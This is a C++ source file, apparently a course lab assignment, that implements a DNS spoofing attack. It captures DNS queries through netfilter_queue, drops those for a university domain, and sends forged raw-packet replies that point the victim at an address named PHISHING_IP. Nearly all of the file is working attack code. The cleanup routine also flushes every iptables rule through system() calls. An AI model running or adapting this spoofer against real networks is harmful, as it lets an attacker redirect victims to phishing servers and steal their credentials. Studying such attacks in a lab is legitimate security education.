#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <unistd.h>
#include <csignal>
#include <cstdlib>

using namespace std;

char* TARGET_DOMAIN = (char*)"www.nycu.edu.tw";
char* PHISHING_IP = (char*)"140.113.207.227";

struct nfq_handle* h = nullptr;
struct nfq_q_handle* qh = nullptr;
int nfd = -1;
sig_atomic_t running = 1;

struct DNS_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

unsigned short checksum(unsigned short* buf, int nwords) {
    unsigned long sum = 0;
    for (int i = 0; i < nwords; i++) {
        sum += buf[i];
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// 解析 domain name
string parse_domain(unsigned char* dns_start) {
    string domain;
    int pos = 12; // DNS header size
    while (dns_start[pos] != 0) {
        int len = dns_start[pos];
        if (!domain.empty()) domain += ".";
        domain += string((char*)(dns_start + pos + 1), len);
        pos += len + 1;
    }
    return domain;
}

// 計算 DNS 問題區長度
int get_question_len(unsigned char* dns_start) {
    int pos = 12;
    while (dns_start[pos] != 0) pos++;
    pos++; // null byte
    pos += 4; // QTYPE + QCLASS
    return pos;
}

// 構造並發送 spoof DNS 回應
void send_spoof_response(struct iphdr* orig_iph, struct udphdr* orig_udph, unsigned char* dns_query, int dns_query_len) {
    int answer_len = 16; // 固定長度的 answer
    int dns_resp_len = dns_query_len + answer_len;
    int udp_len = sizeof(struct udphdr) + dns_resp_len;
    int ip_len = sizeof(struct iphdr) + udp_len;
    unsigned char* packet = new unsigned char[ip_len];
    memset(packet, 0, ip_len);

    // IP header
    struct iphdr* iph = (struct iphdr*)packet;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(ip_len);
    iph->id = htons(rand() % 65536);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = orig_iph->daddr;
    iph->daddr = orig_iph->saddr;
    iph->check = 0;
    iph->check = checksum((unsigned short*)iph, sizeof(struct iphdr)/2);

    // UDP header
    struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));
    udph->source = orig_udph->dest;
    udph->dest = orig_udph->source;
    udph->len = htons(udp_len);
    udph->check = 0; // 可選

    // DNS header + question
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), dns_query, dns_query_len);

    // 修改 flags/ancount
    unsigned char* resp = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    struct DNS_header* dns = (struct DNS_header*)resp;
    dns->flags = htons(0x8180);
    dns->ancount = htons(1);

    // Answer section
    int ans_pos = dns_query_len;
    // Name: pointer to question
    resp[ans_pos++] = 0xc0;
    resp[ans_pos++] = 0x0c;
    // Type: A
    resp[ans_pos++] = 0x00;
    resp[ans_pos++] = 0x01;
    // Class: IN
    resp[ans_pos++] = 0x00;
    resp[ans_pos++] = 0x01;
    // TTL: 300
    resp[ans_pos++] = 0x00;
    resp[ans_pos++] = 0x00;
    resp[ans_pos++] = 0x01;
    resp[ans_pos++] = 0x2c;
    // Data length: 4
    resp[ans_pos++] = 0x00;
    resp[ans_pos++] = 0x04;
    // IP
    in_addr addr;
    inet_aton(PHISHING_IP, &addr);
    memcpy(resp + ans_pos, &addr.s_addr, 4);
    ans_pos += 4;

    // 發送
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph->daddr;
    sendto(sockfd, packet, ip_len, 0, (struct sockaddr*)&dest, sizeof(dest));
    close(sockfd);
    delete[] packet;
}

void signal_handler(int signum) {
    if(signum == SIGINT || signum == SIGTERM) {
        cout << "Shutting Down ..." << endl;
        running = 0;
        if(nfd){
            close(nfd);
        }
    }
}

static int callback(struct nfq_q_handle* qh, struct nfgenmsg* nfmsg, struct nfq_data* nfa, void* data){
    unsigned char* packet;
    int packet_id = -1;
    auto ph = nfq_get_msg_packet_hdr(nfa);
    if (ph) packet_id = ntohl(ph->packet_id);

    int payload_len = nfq_get_payload(nfa, &packet);
    if (payload_len >= 0){
        struct iphdr* iph = (struct iphdr*)packet;
        if (iph->protocol == IPPROTO_UDP){
            struct udphdr* udph = (struct udphdr*)(packet + iph->ihl * 4);
            if (ntohs(udph->dest) == 53){
                unsigned char* dns = packet + iph->ihl * 4 + sizeof(struct udphdr);
                DNS_header* dns_hdr = (DNS_header*)dns;
                // Ignore DNS responses (QR = 1)
                if (ntohs(dns_hdr->flags) & 0x8000) {
                    return nfq_set_verdict(qh, packet_id, NF_ACCEPT, 0, nullptr);
                }
                int dns_query_len = get_question_len(dns);
                string DOMAIN = parse_domain(dns);
                if (DOMAIN == TARGET_DOMAIN){
                    cout << "INTERCEPTED query for "<< DOMAIN << endl;
                    send_spoof_response(iph, udph, dns, dns_query_len);
                    return nfq_set_verdict(qh, packet_id, NF_DROP, 0, nullptr);
                }
            }
        }
    }
    return nfq_set_verdict(qh, packet_id, NF_ACCEPT, 0, nullptr);
}

void CLEAN_IPTABLES(){
    system("iptables -t raw PREROUTING -D -p udp --dport 53 -j NFQUEUE --queue-num 0");
    system("sudo iptables -F");
    system("sudo iptables -t nat -F");
    if(qh)nfq_destroy_queue(qh);
    if(h)nfq_close(h);
    cout << "CLEANED UP " << endl;
}

void CLEAN_FORWARD(){
    system("sudo sysctl -w net.ipv4.ip_forward=0");
    CLEAN_IPTABLES();
}

int main (){
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    h = nfq_open();
    if (!h) {
        cerr << "Error during nfq_open()" << endl;
        return -1;
    }
    nfq_unbind_pf(h, AF_INET);
    if (nfq_bind_pf(h, AF_INET) < 0) {
        cerr << "Error during nfq_bind_pf()" << endl;
        return -1;
    }
    qh = nfq_create_queue(h, 0, &callback, nullptr);
    nfd = nfq_fd(h);
    nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff);

    int recv_len;
    char buf[4096] __attribute__((aligned));
    cout << "Listening for DNS queries..." << endl;
    while (running) {
        recv_len = recv(nfd, buf, sizeof(buf), 0);
        if (recv_len >= 0) {
            nfq_handle_packet(h, buf, recv_len);
        } else if (recv_len < 0 && errno != EINTR) {
            cerr << "Error during recv(): " << strerror(errno) << endl;
        }
    }

    CLEAN_FORWARD();
    return 0;
}